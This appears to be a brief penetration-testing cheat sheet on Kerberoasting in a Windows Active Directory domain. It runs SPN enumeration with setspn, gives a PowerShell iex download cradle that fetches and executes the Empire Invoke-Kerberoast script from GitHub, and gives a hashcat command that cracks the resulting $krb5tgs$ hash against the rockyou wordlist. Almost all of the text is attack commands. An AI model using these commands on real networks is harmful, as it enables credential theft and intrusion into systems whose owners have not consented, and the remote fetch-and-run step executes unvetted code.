# Kerberoasting

## Enumeration

From powershell on the Windows box, call `setspn -T medin -Q */*` to get all accounts in the Service Principal Name (SPN).

This will output a list on the form:
```
CN=${USER},CN=Users,DC=${DC},DC=local
```

Look for the service that looks promising.

Now, we can get the `Invoke-Kerberoast` script:

```
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
```

(or get the script from your attack box)

now, copy the Hash (including the prefix `$krb5tgs$`) into a file in a single line, and call:

```
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
